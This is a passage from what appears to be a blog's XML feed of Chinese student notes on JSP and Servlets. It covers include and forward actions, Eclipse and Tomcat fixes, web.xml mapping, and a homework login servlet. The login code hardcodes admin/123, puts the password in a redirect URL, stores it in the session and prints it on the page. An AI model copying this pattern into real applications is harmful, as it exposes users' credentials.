%&gt;</code></li></ol><ul><li>include编译指令是在jsp程序的转换时期就将file属性所制定的程序内容嵌入，然后再编译执行；</li><li>只生成一个class文件</li><li>include不能带参数</li><li>同一个request对象</li></ul><ol start="2"><li><code>&lt;jsp:include page=&quot;date.jsp&quot; flush=&quot;true&quot; /&gt;</code></li></ol><ul><li>而include指令在转换期间是不会被编译的，只有在客户端请求时期如果被执行到才会被动态的编译载入。</li><li>生成多个class文件</li><li><a href="jsp:include">jsp:include</a>可以</li><li>不同的request对象，可以去的包含他的页面的参数，并添加了自己的参数。</li></ul><h3 id="3-4、forward动作："><a href="#3-4、forward动作：" class="headerlink" title="3.4、forward动作："></a>3.4、forward动作：</h3><p>forward的动作标记语法格式：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;jsp:forward page=<span class="string">&quot;文件的URL&quot;</span> /&gt;</span><br><span class="line">或者</span><br><span class="line">&lt;jsp:forward page=<span class="string">&quot;文件的URL&quot;</span>&gt;</span><br><span class="line"><span class="comment">//可以在forward中进行传参操作</span></span><br><span class="line">&lt;jsp:param name=<span class="string">&quot;参数名称&quot;</span> value=<span class="string">&quot;参数值&quot;</span>/&gt;</span><br><span class="line">&lt;/jsp:forward&gt;</span><br></pre></td></tr></table></figure><h3 id="3-5、plugin动作："><a href="#3-5、plugin动作：" class="headerlink" title="3.5、plugin动作："></a>3.5、plugin动作：</h3><p>plugin标签只是jsp文件加载java plugin，该插件由客户负责下载，并使用该插件负责下载，并使用该插件来运行java applet，其中plugin动作标记语法格式如下：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;jsp:plugin type=<span class="string">&quot;applet&quot;</span> code=<span class="string">&quot;小应用程序的字节码文件&quot;</span> jreversion=<span class="string">&quot;java虚拟机版本号&quot;</span> width=<span class="string">&quot;小程序宽度值&quot;</span> height=<span class="string">&quot;小程序口高度值&quot;</span>&gt;</span><br><span class="line">  &lt;jsp:fallback&gt;</span><br><span class="line">     提示信息：用来提示用户的浏览器是否支持插件下载。</span><br><span class="line">  &lt;/jsp:fallback&gt;</span><br><span class="line">&lt;/jsp:plugin&gt;</span><br></pre></td></tr></table></figure><h3 id="3-6、useBean动作："><a href="#3-6、useBean动作：" class="headerlink" title="3.6、useBean动作："></a>3.6、useBean动作：</h3><p>useBean标签用来创建并使用一个java beans，是非常重要的一个动作标签。sun公司的倡导是：用html完成jsp页面的静态部分，用javabeans完成动态部分，实现真正意义上的静态和动态分割。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Notes </tag>
            
            <tag> JSP </tag>
            
            <tag> Campus </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JSP使用中问题汇总</title>
      <link href="/2016/12/01/jsp-problem/"/>
      <url>/2016/12/01/jsp-problem/</url>
      
        <content type="html"><![CDATA[<h2 id="一、说明："><a href="#一、说明：" class="headerlink" title="一、说明："></a>一、说明：</h2><p>本篇主要说明在我学习JSP的相关过程中，遇到的最凸显的一些问题，肯定附带一些IDE工具(这里主要是Eclipse)的一些问题，为了方便查询，特此记录。我自身软件环境如下：</p><ol><li>Eclipse Java EE IDE for Web Developers.<br>  Version: Neon.1a Release (4.6.1)；</li><li>Apache Tomcat version: 8.5.8</li></ol><blockquote><p>###进入Servlet映射的虚拟路径的404错误问题</p></blockquote><p>我发现在使用Eclipse利用servlet3.0及以上的版本写虚拟路径映射的时候，默认没有web.xml的时候(当然与这无关)，在路径都书写正确的情况下始终无法进入对应的路径，Eclipse的控制台提示错误为：</p><p><code>[SetPropertiesRule]&#123;Server/Service/Engine/Host/Context&#125; Setting property &#39;source&#39; to &#39;org.eclipse.jst.jee.server:Test&#39; did not find a matching property.</code></p><p>浏览器会提示404错误，我系统默认浏览器与Eclipse的Internal Web Browser都是这个错误。错误如下图所示：</p><p><img src="https://cdn.bugwz.com/006qpCDTjw1fa9c38kniyj30f506z0sw.jpg" alt="404 Error in Chrome"><br><img src="https://cdn.bugwz.com/006qpCDTjw1fa9c6a1qpej30cp06s3ym.jpg" alt="404 Error in Self Browser"></p><p>然后我尝试选择附带web.xml的情况下重建工程，依旧会出现这个错误，最后经过一番查找，发现原因应该是Tomcat6.0及以后的版本中的server.xml的context节点中不支持source属性，我在官网找到如下信息：</p><p><img src="https://cdn.bugwz.com/006qpCDTjw1fa9ce8nzxyj30vo0f1tbr.jpg" alt="Tomcat6.0 Not Support &quot;Source&quot;"></p><p>其中最主要的一句好像是：</p><p><code>It is NOT recommended to place &lt;Context&gt; elements directly in the server.xml file. This is because it makes modifying the Context configuration more invasive since the main conf/server.xml file cannot be reloaded without restarting Tomcat.</code></p><p>解决方法为：<br>这里通过修改Tomcat server配置，首先关闭server，然后在server视图中双击server，打开配置界面，选中下面的”Publish module contexts to separate XML files”，保存退出。如下图所示，重启Eclipse即可!</p><p>解决办法的网络参考：<a href="http://siruoxian.iteye.com/blog/1103347">http://siruoxian.iteye.com/blog/1103347</a></p><p><img src="https://cdn.bugwz.com/006qpCDTjw1fa9citv12aj30ld0aywf9.jpg" alt="Change Tomcat Server Config"></p><hr><blockquote><p>###在Servlet使用过程中的编码问题</p></blockquote><p>这里不讨论各种编码方式的优缺点，这里只是说明我们在日常使用过程中出现的编码问题，这也是最让人头痛的问题。我使用的UTF-8编码。<br>我们在使用Eclipse进行项目的时候，比如说吧，我说一下我曾记出现的一个问题。</p><p>响应为http的post响应请求，当然这里http的响应请求方式无所谓，然后是我的页面显示编码全部规定是UTF-8，即<code>resp.setHeader(&quot;Content-type&quot;, &quot;text/html;charset=UTF-8&quot;);</code>，resp为HttpServletResponse对象类型，但是我并没有设置<code>req.setCharacterEncoding(&quot;UTF-8&quot;);</code>，此处的req为HttpServletRequest对象，然后我发现，页面的显示就会出现乱码。</p><p>这是我遇到的问题一，还有一个更严重的问题就是页面实际使用的编码与你要求页面显示的编码方式不统一，由于Eclipse本身默认的文本编码为GBK，并且我们在Eclipse中建立的各种工程全部是继承系统默认的文本编码方式，但是我经常使用的页面编码显示为UTF-8，这就会出现意想不到的问题，为了解决这一问题，我强烈建议，你想让页面以什么编码方式显示，一定要用该编码编辑该文本，其中Eclipse的编码设置位置，如下图所示：</p><p><img src="https://cdn.bugwz.com/006qpCDTjw1fabgla91ifj30m20imabn.jpg" alt="Change Text Coding"></p><hr><blockquote><p>###Eclipse的汉化方法</p></blockquote><p>虽然说使用英文的IDE可以不断的锻炼自己的英文水平，并且能够避免很多错译，或者语言文件本身存在的bug导致软件无法正常的运行等等问题。</p><p>但是，但是，因为Eclipse本身软件的影响力，其官方的汉化文件已经做得非常好了，IDE本身的汉化比已经达到80%多，加上英文IDE本身给人的恐惧心理，让我们没法深入探索这个IDE工具的有趣之处，我们可能只是按需的在这款软件内依次点击那几个按钮，完成老师交代的那一丁丁任务而已，我们也只是稍微碰过这款软件，也许是因为英文而没有那种想去探索的勇气，一个英文不好的人去用，的却会浪费很多时间，最起码我是因为英文不想去接触，说实话，我有点怕麻烦，进入正题，汉化过程如下：</p><p>访问Eclipse的官网语言下载链接：<a href="https://www.eclipse.org/babel/downloads.php">这里</a>；然后我们选择对应我们IDE的语言包进行下载，如下图所示：</p><p><img src="https://cdn.bugwz.com/006qpCDTjw1fabhmpqvgjj30oh09x75b.jpg" alt="IDE Language Pack"></p><p>下载后，接下，记住解压后的文件的目录绝对路径，然后我们打开Eclipse这个IDE工具，依次选择Help-&gt;Install New Software-&gt;Add…-&gt;Local…；然后添加那个解压的文件的文件夹，然后确定后，进行等待，然后展开下图中的一个语言包：</p><p><img src="https://cdn.bugwz.com/006qpCDTjw1fabht9088lj30t70jrgnb.jpg" alt="Install Language Pack"></p><p>此处切记哈，不要安装这个语言包中的所有插件，因为有一些汉化的极其不好，并且你全部安装后会发现Eclipse的有些功能莫名地无法使用，就是因为有一些语言包插件有问题，为了能最大的汉化并不影响我们的日常使用，我推荐选择其中一款名字接近于”for eclipse…”的插件，目前该插件汉化Eclipse的汉化率在80%以上，其他的操作一次进行即可。</p><hr><blockquote><p>###Eclipse中导入其他的工程时出错，无法运行</p></blockquote><p>当我们从别人的机器中拷贝出一个工程项目并在我们的电脑中导入该工程后，很容易出现的问题就是出错，无法运行，这其中有很大的原因在于工程项目的构建路径中的JAR和类文件夹出错。</p><p>我们知道，每个工程的构建依赖于电脑自身的Java与Tomcat环境，如果一个人的电脑配置的环境是Java1.7，并且它的Tomcat环境是7.0.73,他新建一个工程的时候Eclipse自然在构建路径中配置这些信息，但是由于我的系统环境为Java1.8,Tomcat8.5.8，这样就会因为找不到对应的配置环境而出错，还有一种可能性是，你环境的安装路径不对，这里仅是推测。出错可能如下图所示：</p><p><img src="https://cdn.bugwz.com/006qpCDTjw1fach5an9r3j30t60ce0u8.jpg" alt="Path Error"></p><p>然后我们的纠错步骤为，修改该工程的构建路径中的的JAR和类文件夹信息，删除出错的，添加我们本机的Java环境以及Tomcat环境，如下图所示：</p><p><img src="https://cdn.bugwz.com/006qpCDTjw1fach7tx90lj30p60b3wfa.jpg" alt="Library Error"><br><img src="https://cdn.bugwz.com/006qpCDTjw1fach9xe23dj30v40f7abu.jpg" alt="Runtime Error"></p><p>这样的话，该工程的错误就回消失，当然还有一点是可能是该工程的原始环境较现在的环境较新，因此出错，这样的话就具体针对错误提示就行排除。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Notes </tag>
            
            <tag> JSP </tag>
            
            <tag> Campus </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>利用Servlet完成表单提交验证-JSP作业-2</title>
      <link href="/2016/11/30/jsp-homework-2/"/>
      <url>/2016/11/30/jsp-homework-2/</url>
      
        <content type="html"><![CDATA[<h2 id="一、环境"><a href="#一、环境" class="headerlink" title="一、环境"></a>一、环境</h2><ol><li>Eclipse Java EE IDE for Web Developers.<br>  Version: Neon.1a Release (4.6.1)</li><li>Apache Tomcat version: 8.0.39</li></ol><h2 id="二、作业内容："><a href="#二、作业内容：" class="headerlink" title="二、作业内容："></a>二、作业内容：</h2><p>利用三个servlet，实现表单页面的输出，表单提交的信息的验证以及验证信息后的跳转页面。</p><h2 id="三、开始"><a href="#三、开始" class="headerlink" title="三、开始"></a>三、开始</h2><p>我们一共需要建立三个servlet类，他们分别是：Login.java，LoginContral.java和Welcome.java，他们的具体代码如下所示：</p><blockquote><p>1.Login()类代码如下：</p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@WebServlet(&quot;/Login&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Login</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1L</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@see</span> HttpServlet#HttpServlet()</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Login</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        <span class="comment">// TODO Auto-generated constructor stub</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line"><span class="comment">// TODO 自动生成的方法存根</span></span><br><span class="line"><span class="comment">//super.doGet(req, resp);</span></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="comment">// 解决页面显示的中文乱码问题</span></span><br><span class="line">resp.setContentType(<span class="string">&quot;text/html;charset=UTF-8&quot;</span>);</span><br><span class="line"><span class="comment">//解决中文在传输过程中的乱码问题</span></span><br><span class="line">req.setCharacterEncoding(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line"><span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> resp.getWriter();</span><br><span class="line">out.println(<span class="string">&quot;&lt;html&gt;&quot;</span>);</span><br><span class="line">out.println(<span class="string">&quot;&lt;head&gt;&lt;title&gt;登陆页面&lt;/title&gt;&lt;/head&gt;&quot;</span>);</span><br><span class="line">out.println(<span class="string">&quot;&lt;body&gt;&quot;</span>);</span><br><span class="line">out.println(<span class="string">&quot;&lt;h1&gt;登陆页面&lt;/h1&gt;&quot;</span>);</span><br><span class="line">out.println(<span class="string">&quot;&lt;form action=&#x27;LoginControl&#x27;&gt;&quot;</span>);</span><br><span class="line">out.println(<span class="string">&quot;用户名：&lt;input type=&#x27;text&#x27; name=&#x27;username&#x27; /&gt;&lt;br&gt;&quot;</span>);</span><br><span class="line">out.println(<span class="string">&quot;密码：&lt;input type=&#x27;password&#x27; name=&#x27;password&#x27; /&gt;&lt;br&gt;&quot;</span>);</span><br><span class="line"><span class="comment">// 添加隐藏input元素（这种类型元素在页面上不显示，但是可以传递到其他的页面）</span></span><br><span class="line">out.println(<span class="string">&quot;&lt;input type=&#x27;hidden&#x27; name=&#x27;sex&#x27; value=&#x27;man&#x27; /&gt;&quot;</span>);</span><br><span class="line">out.println(<span class="string">&quot;&lt;input type=&#x27;submit&#x27; value=&#x27;登陆&#x27;&gt;&quot;</span>);</span><br><span class="line">out.println(<span class="string">&quot;&lt;/form&gt;&quot;</span>);</span><br><span class="line">out.println(<span class="string">&quot;&lt;/body&gt;&quot;</span>);</span><br><span class="line">out.println(<span class="string">&quot;&lt;/html&gt;&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>2.LoginControl()类代码如下：</p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@WebServlet(&quot;/LoginControl&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LoginControl</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1L</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@see</span> HttpServlet#HttpServlet()</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">LoginControl</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        <span class="comment">// TODO Auto-generated constructor stub</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line"><span class="comment">// TODO 自动生成的方法存根</span></span><br><span class="line"><span class="comment">// super.doGet(req, resp);</span></span><br><span class="line"><span class="comment">// 获取请求的信息（方法的参数需要与input元素中name属性值相同，否则取不到值）</span></span><br><span class="line"><span class="comment">// 解决页面显示的中文乱码问题</span></span><br><span class="line">resp.setContentType(<span class="string">&quot;text/html;charset=UTF-8&quot;</span>);</span><br><span class="line"><span class="comment">//解决中文在传输过程中的乱码问题</span></span><br><span class="line">req.setCharacterEncoding(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;username&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;password&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">sex</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;sex&quot;</span>);</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (username.equals(<span class="string">&quot;admin&quot;</span>) &amp;&amp; password.equals(<span class="string">&quot;123&quot;</span>)) &#123;<span class="comment">// 合法</span></span><br><span class="line"><span class="comment">// 页面的跳转（注意：这个方法的参数是url-pattern里面配置的）</span></span><br><span class="line"><span class="comment">// 当用户合法后，把用户名和密码写到cookie，供welcome页面取出并显示</span></span><br><span class="line"><span class="comment">// a.用cookie实现不同页面之间数据的共享</span></span><br><span class="line"><span class="comment">// 1.创建cookie</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Cookie c1 = new Cookie(&quot;username&quot;,username); Cookie c2 = new</span></span><br><span class="line"><span class="comment"> * Cookie(&quot;password&quot;,password);</span></span><br><span class="line"><span class="comment"> * //设定cookie在客户端存在的时间,单位为s（如果没有设定的话，当关闭浏览器时，cookie消失或者过期）</span></span><br><span class="line"><span class="comment"> * c1.setMaxAge(10); c2.setMaxAge(10); //2.向客户端写cookie</span></span><br><span class="line"><span class="comment"> * response.addCookie(c1); response.addCookie(c2);</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">// c.利用session阻止用户的非法登录</span></span><br><span class="line"><span class="comment">// 如果用户名合法，则把用户名放到session里面</span></span><br><span class="line"><span class="type">HttpSession</span> <span class="variable">hs</span> <span class="operator">=</span> req.getSession();</span><br><span class="line"><span class="comment">// 设置session的生命时间（单位s）</span></span><br><span class="line">hs.setMaxInactiveInterval(<span class="number">30</span>);</span><br><span class="line"><span class="comment">// 向session中放置属性</span></span><br><span class="line">hs.setAttribute(<span class="string">&quot;username&quot;</span>, username);</span><br><span class="line">hs.setAttribute(<span class="string">&quot;password&quot;</span>, password);</span><br><span class="line"><span class="comment">// b.通过sendRedirect实现不同页面之间数据的共享</span></span><br><span class="line">resp.sendRedirect(<span class="string">&quot;Welcome?username=&quot;</span> + username + <span class="string">&quot;&amp;password=&quot;</span> + password + <span class="string">&quot;&amp;sex=&quot;</span> + sex);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// 不合法</span></span><br><span class="line"><span class="comment">// 这个方法的参数是url-pattern里面配置的</span></span><br><span class="line">resp.sendRedirect(<span class="string">&quot;Login&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>3.LoginControl()类代码如下：</p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@WebServlet(&quot;/Welcome&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Welcome</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1L</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@see</span> HttpServlet#HttpServlet()</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Welcome</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        <span class="comment">// TODO Auto-generated constructor stub</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line"><span class="comment">// TODO 自动生成的方法存根</span></span><br><span class="line"><span class="comment">// super.doGet(req, resp);</span></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="comment">// 解决页面显示的中文乱码问题</span></span><br><span class="line">resp.setContentType(<span class="string">&quot;text/html;charset=UTF-8&quot;</span>);</span><br><span class="line"><span class="comment">//解决中文在传输过程中的乱码问题</span></span><br><span class="line">req.setCharacterEncoding(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line"><span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> resp.getWriter();</span><br><span class="line"><span class="comment">// a.通过cookie来获取共享信息；</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * //3.获取cookie Cookie[] cs=request.getCookies();</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * if(cs!=null)&#123; for(int i=0;i&lt;cs.length;i++)&#123; Cookie temp = cs[i];</span></span><br><span class="line"><span class="comment"> * out.println(temp.getName()+&quot;:&quot;+temp.getValue()); &#125; &#125;else&#123;</span></span><br><span class="line"><span class="comment"> * out.println(&quot;cookie不存在或者已过期！&quot;); &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">// b.通过sendRedirect来获取共享信息</span></span><br><span class="line"><span class="comment">// String username = request.getParameter(&quot;username&quot;);</span></span><br><span class="line"><span class="comment">// String password = request.getParameter(&quot;password&quot;);</span></span><br><span class="line"><span class="comment">// String sex = request.getParameter(&quot;sex&quot;);</span></span><br><span class="line"><span class="comment">// out.println(&quot;username==&quot;+username+&quot; password==&quot;+password+&quot;</span></span><br><span class="line"><span class="comment">// sex==&quot;+sex);</span></span><br><span class="line"><span class="comment">// c.通过session 阻止非法用户登录网站内部</span></span><br><span class="line"><span class="comment">// 获取session</span></span><br><span class="line"><span class="type">HttpSession</span> <span class="variable">hs</span> <span class="operator">=</span> req.getSession();</span><br><span class="line"><span class="comment">// 根据session中的属性名获取相应的属性值</span></span><br><span class="line"><span class="type">String</span> <span class="variable">usernameSession</span> <span class="operator">=</span> (String) hs.getAttribute(<span class="string">&quot;username&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">passwordSession</span> <span class="operator">=</span> (String) hs.getAttribute(<span class="string">&quot;password&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (usernameSession != <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="comment">// 如果从session当中能够获取用户名，则可以进入我的网站</span></span><br><span class="line">out.println(<span class="string">&quot;欢迎登陆我们的网站！用户名：&quot;</span> + usernameSession + <span class="string">&quot; 密码：&quot;</span>+ passwordSession);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// 否则显示空白页面</span></span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Notes </tag>
            
            <tag> JSP </tag>
            
            <tag> Campus </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>初次使用Servlet-JSP笔记-1</title>
      <link href="/2016/11/29/jsp-1/"/>
      <url>/2016/11/29/jsp-1/</url>
      
        <content type="html"><![CDATA[<h2 id="一、环境"><a href="#一、环境" class="headerlink" title="一、环境"></a>一、环境</h2><ol><li>Eclipse Java EE IDE for Web Developers. Version: Mars.1 Release (4.5.1)</li><li>Apache Tomcat version: 8.0.39</li></ol><h2 id="二、课堂学习目标"><a href="#二、课堂学习目标" class="headerlink" title="二、课堂学习目标"></a>二、课堂学习目标</h2><p>了解servlet的虚拟路径使用方法，这里具体讲解使用Eclipse的servlet3.0之前的版本(使用servlet2.5版本)中关于WebContent&#x2F;WEB-INF&#x2F;web.xml的使用方法以及servlet3.0及之后的版本的虚拟路径使用方法。</p><h2 id="三、开始"><a href="#三、开始" class="headerlink" title="三、开始"></a>三、开始</h2><blockquote><p>测试一：利用servlet3.0之前的版本进行测试</p></blockquote><p>利用Eclipse新建一个Dynamin Web Project,调用安装的Apache Tomcat V8.0版本，然后选择2.5的servlet版本，该IDE会自动新建一个WebContent&#x2F;WEB-INF&#x2F;web.xml文件。</p><p><img src="https://cdn.bugwz.com/006qpCDTjw1fa8yo0l2hnj30hy0jmmy9.jpg" alt="New Dynamic Web Project"></p><p>之后我们新建两个servlet，一个直接全部使用默认设置，另一个我们点击下一步后不使用默认自带的doPost()和doGet()方法。</p><p><img src="https://cdn.bugwz.com/006qpCDTjw1fa8ytojjcyj30e60e7wf1.jpg" alt="Create Servlet"></p><p>新建一个index.jsp文件后，软件视图如图所示：</p><p><img src="https://cdn.bugwz.com/006qpCDTjw1fa8z11vt9wj311q0k1gog.jpg" alt="index.jsp"></p><p>因为本次我们需要利用servlet配置虚拟路径，所以我们直接利用未初始化重写方法doPost()和doGet()的Servlet_2.java进行操作，在Servlet_2.java中的Servlet_2类中空白处点击右键，选择”源码”,然后选择”覆盖&#x2F;实现方法”中选择对应的doGet()，然后我们进行重写操作，输出一行数据。</p><p><img src="https://cdn.bugwz.com/006qpCDTjw1fa8z899s4gj30rb0brt9h.jpg" alt="Servlet2.java"></p><p>然后我们就需要修改web.xml文件进行虚拟路径的部署，这里由于我们提到了web.xml文件，所以，我们需要介绍一下什么是web.xml文件。</p><h1 id="题外话：什么是web-xml文件？"><a href="#题外话：什么是web-xml文件？" class="headerlink" title="题外话：什么是web.xml文件？"></a>题外话：什么是web.xml文件？</h1><p>web.xml文件可以简单的理解成servlet的一个配置文件,通过这个配置文件来寻找对应的servlet处理业务。配置web.xml的目的就是让容器知道你的请求是由那个servlet处理，然后把httprequest和httpresponse对象注入到该servlet中。一个web.xml中当然可以存在多个servlet规则，具体的使用方法下面将进行介绍。</p><p>需要注意的是，所有部署描述符文件的顶层（根）元素为web-app。而XML元素不像HTML，他们是大小写敏感的。因此，web-App和WEB-APP都是不合法的，web-app必须用小写。 </p><h1 id="继续"><a href="#继续" class="headerlink" title="继续"></a>继续</h1><p>web.xml中配置映射servlet的规则十分简单，如下列代码所示：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;servlet&gt;</span><br><span class="line">    &lt;servlet-name&gt;Servlet_2&lt;/servlet-name&gt;</span><br><span class="line">    &lt;servlet-class&gt;com.bugwz.servlet.Servlet_2&lt;/servlet-class&gt;</span><br><span class="line">  &lt;/servlet&gt;</span><br><span class="line">  &lt;servlet-mapping&gt;</span><br><span class="line">    &lt;servlet-name&gt;Servlet_2&lt;/servlet-name&gt;</span><br><span class="line">    &lt;url-pattern&gt;/Servlet_2&lt;/url-pattern&gt;</span><br><span class="line">  &lt;/servlet-mapping&gt;</span><br></pre></td></tr></table></figure><p>如果你使用的servlet的版本是3.0之前的版本，如果你想要成功映射的话，你必须将这些代码(上面的代码是必须的，最简化)正确的在web.xml文件的web-app标签中书写，上述代码具体讲解如下：</p><ol><li>servlet标签</li></ol><ul><li>servlet-name标签内的信息对应servlet-mapping标签内的servlet-name的标签内的信息，推荐其内的信息与servlet的类名相同。</li><li>servlet-class标签内的信息为映射对象的信息，具体格式为”servlet所属包名.servlet的类名”，这样才能找到具体的类，并执行。</li></ul><ol start="2"><li>servlet-mapping标签</li></ol><ul><li>servlet-name标签内的信息内容上面已经说了。</li><li>url-pattern标签内的信息为该项目下的虚拟路径，也就是说项目下的&#x2F;Servlet_2就会展示类Servlet_2中的信息，这里的虚拟路径可以根据需求修改。实践可知，url-pattern中信息若为&#x2F;*，则该项目的所有子栏目，全部指向该处对应的类，是否可以通过某种方式存放正则表达式待考证。</li></ul><ol start="3"><li>执行过程为，根据servlet-mapping标签的子标签url-pattern的虚拟路径，按照servlet-mapping标签内的子标签servlet-name的信息，去寻找servlet标签中的子标签servlet-name中相同的信息，然后展示对应的servlet-class标签中的类中的可展示内容。</li></ol><blockquote><p>测试二：利用servlet3.0及其之后的版本进行测试</p></blockquote><p>这里需要说明的是如果你的项目目前使用的是servlet3.0及之后的版本，那么你的项目中不会直接创建web.xml，servlet3.0 及之后的版本中新增的注解支持简化了 Servlet&#x2F; 过滤器 &#x2F; 监听器的声明，从而使得 web.xml 变为可选配置。这里我们使用servlet3.1版本，目前最新的版本。</p><p><img src="https://cdn.bugwz.com/006qpCDTjw1fa90a1a2m7j30hu0jjq46.jpg" alt="New Dynamic Web Project - Version"></p><p>我们依次新建两个<code>Servlet_1.java</code>和<code>Servlet_2.java</code>，然后我们会发现在新建的servlet中带了下面这一行代码，如下图所示：</p><p><code>@WebServlet(&quot;/Servlet_2&quot;)</code></p><p><img src="https://cdn.bugwz.com/006qpCDTjw1fa90hj12e6j30su0d9mye.jpg" alt="Servlet_2"></p><p>上面那一行代码其实就充当了web.xml中的定义的虚拟路径的那几行代码的功能，因此servlet3.0及之后的版本简化了代码的书写量，更加简单易用。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Notes </tag>
            
            <tag> JSP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>理解Servlet的init()、service()与destroy()-JSP笔记-2</title>
      <link href="/2016/11/29/jsp-2/"/>
      <url>/2016/11/29/jsp-2/</url>
      
